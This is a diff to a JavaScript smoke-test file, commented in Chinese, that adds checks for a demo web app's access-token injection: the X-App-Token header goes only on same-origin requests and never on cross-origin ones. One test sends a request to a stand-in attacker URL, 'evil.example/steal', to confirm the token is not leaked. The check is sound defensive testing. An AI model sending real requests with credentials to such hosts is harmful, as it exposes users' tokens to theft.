@@ -29,8 +29,12 @@ function jsonRes(obj) {
   return Promise.resolve({ ok: true, status: 200, json: () => Promise.resolve(obj) });
 }
 
+// 记录每次 fetch 的 url/init，供「访问令牌注入」断言用（令牌只能对同源请求生效）
+const fetchLog = [];
+
 function makeFetchStub() {
-  return (url) => {
+  return (url, init) => {
+    fetchLog.push({ url: String(url), init });
     const u = String(url);
     if (u.includes('/demo/spots')) {
       return jsonRes({ city: '西安', spots: [{
@@ -201,6 +205,38 @@ const sleep = (ms) => new Promise(r => setTimeout(r, ms));
   // 5b) 全量 progress 不得重放：FakeWS 连推两帧同一份数组，去重后每条日志只出现一次
   const doneCount = ((logEl?.textContent || '').match(/冒烟：已完成/g) || []).length;
   check('进度日志：全量 progress 重放被去重', doneCount === 1, `出现 ${doneCount} 次`);
+
+  // 6) 访问令牌注入：只在**同源**请求上加 X-App-Token，跨域绝不带（防泄露）。
+  //    注入由 <head> 里的 window.fetch 包装层完成；这里用 stub 记录的 init 验证。
+  const headerVal = (headers, name) => {
+    if (!headers) return null;
+    if (typeof headers.get === 'function') return headers.get(name);   // 原生 Headers
+    if (Array.isArray(headers)) {
+      const p = headers.find(p => String(p[0]).toLowerCase() === name.toLowerCase());
+      return p ? p[1] : null;
+    }
+    const k = Object.keys(headers).find(k => k.toLowerCase() === name.toLowerCase());
+    return k ? headers[k] : null;
+  };
+
+  check('令牌：页面有 #tokenBtn 入口', !!d.getElementById('tokenBtn'));
+
+  // 未设置令牌：首屏所有同源请求都不该多带该头（行为与改造前一致）
+  check('令牌：未设置时请求不带 X-App-Token',
+    fetchLog.length > 0 && fetchLog.every(c => headerVal(c.init && c.init.headers, 'X-App-Token') === null),
+    `calls=${fetchLog.length}`);
+
+  // 设置令牌后：同源带、跨域不带
+  window.setAppToken('T');
+  await window.fetch('/demo/spots?city=西安');
+  const sameCall = fetchLog[fetchLog.length - 1];
+  check('令牌：同源请求带上 X-App-Token=T',
+    headerVal(sameCall.init && sameCall.init.headers, 'X-App-Token') === 'T');
+
+  await window.fetch('https://evil.example/steal');
+  const crossCall = fetchLog[fetchLog.length - 1];
+  check('令牌：跨域请求不带 X-App-Token（防泄露）',
+    headerVal(crossCall.init && crossCall.init.headers, 'X-App-Token') === null);
 
   if (errors.length) {
     console.log('\n运行时错误：');
